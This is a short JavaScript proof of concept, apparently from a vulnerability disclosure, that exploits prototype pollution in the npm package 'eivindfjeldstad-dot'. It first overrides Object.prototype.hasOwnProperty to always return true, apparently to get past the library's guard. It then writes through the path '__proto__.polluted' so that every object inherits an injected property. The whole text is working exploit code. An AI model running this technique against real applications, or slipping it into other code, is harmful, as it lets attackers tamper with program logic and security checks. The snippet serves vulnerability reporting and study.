Object.prototype.hasOwnProperty = () => true;
const a = require('eivindfjeldstad-dot');
console.log({}.polluted);
let path = '__proto__.polluted';
a.set({}, path, 'yes');
console.log({}.polluted);